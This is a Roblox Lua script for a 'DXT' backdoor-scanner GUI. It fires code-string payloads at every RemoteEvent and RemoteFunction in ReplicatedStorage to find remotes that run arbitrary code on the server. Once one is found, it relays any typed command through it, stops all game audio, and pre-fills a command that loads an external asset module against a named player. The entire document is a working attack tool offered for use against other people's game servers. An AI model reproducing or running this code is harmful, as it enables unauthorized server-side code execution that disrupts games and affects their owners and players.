local foundBackdoors = {}
local scanning = false

local scanFoundPayload = [[
local h = Instance.new("Hint")
h.Parent = workspace
h.Text = "DXT SCANNER! | SLOW SCANNING | JOIN DXT NOWðŸ˜± | READY TO SKIDDED"
]]

local stopMusicPayload = [[
for _, obj in ipairs(workspace:GetDescendants()) do
    if obj:IsA("Sound") then
        obj:Stop()
    end
end
]]

local RS = game:GetService("ReplicatedStorage")

local function waitFor(name, timeout)
    local start = tick()
    while tick() - start < timeout do
        if workspace:FindFirstChild(name) then
            return workspace[name]
        end
        task.wait()
    end
    return nil
end

local function scanBackdoor()
    if scanning then return end
    scanning = true

    foundBackdoors = {}
    LMG2L["scan_10"].Text = "Scanning..."
    LMG2L["INDICATOR BACKDOOR_19"].BackgroundColor3 = Color3.fromRGB(255, 170, 0)

    local remotes = {}
    for _, v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end

    for _, remote in ipairs(remotes) do
        if #foundBackdoors > 0 then break end

        local uid = "DXT_TEST_" .. tick() .. "_" .. math.random(1000,9999)
        local modelName = uid .. "_M"
        local partName = uid .. "_P"

        local modelPayload = 'Instance.new("Model", workspace).Name="'..modelName..'"'
        local partPayload = 'Instance.new("Part", workspace).Name="'..partName..'"'

        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(modelPayload)
            else
                remote:InvokeServer(modelPayload)
            end
        end)

        local model = waitFor(modelName, 2)
        if not model then continue end

        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(partPayload)
            else
                remote:InvokeServer(partPayload)
            end
        end)

        local part = waitFor(partName, 2)
        if not part then
            model:Destroy()
            continue
        end

        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(scanFoundPayload)
            else
                remote:InvokeServer(scanFoundPayload)
            end
        end)

        task.wait(0.5)
        local hint = workspace:FindFirstChildOfClass("Hint")
        if hint and hint.Text == "DXT SCANNER! | SLOW SCANNING | JOIN DXT NOWðŸ˜± | READY TO SKIDDED" then
            table.insert(foundBackdoors, remote)
            LMG2L["scan_10"].Text = "Found Backdoor"
            LMG2L["INDICATOR BACKDOOR_19"].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            break
        else
            if model.Parent then model:Destroy() end
            if part.Parent then part:Destroy() end
        end
    end

    if #foundBackdoors == 0 then
        LMG2L["scan_10"].Text = "Not found Backdoor :("
        LMG2L["INDICATOR BACKDOOR_19"].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end

    scanning = false
end

LMG2L["exec_17"].MouseButton1Click:Connect(function()
    local cmd = LMG2L["TextBox_15"].Text
    if cmd:gsub("%s","") == "" then return end

    for _, bd in ipairs(foundBackdoors) do
        pcall(function()
            if bd:IsA("RemoteEvent") or bd:IsA("BindableEvent") then
                bd:FireServer(cmd)
            elseif bd:IsA("RemoteFunction") then
                bd:InvokeServer(cmd)
            end
        end)
    end
end)

LMG2L["clear_7"].MouseButton1Click:Connect(function()
    LMG2L["TextBox_15"].Text = ""
end)

LMG2L["Clear all Music_a"].MouseButton1Click:Connect(function()
    for _, bd in ipairs(foundBackdoors) do
        pcall(function()
            if bd:IsA("RemoteEvent") then
                bd:FireServer(stopMusicPayload)
            else
                task.spawn(function() bd:InvokeServer(stopMusicPayload) end)
            end
        end)
    end
end)

LMG2L["Sugma_3"].MouseButton1Click:Connect(function()
    LMG2L["TextBox_15"].Text = 'require(11183244198):s("sugma", game.Players["'..PlayerName..'"])'
end)

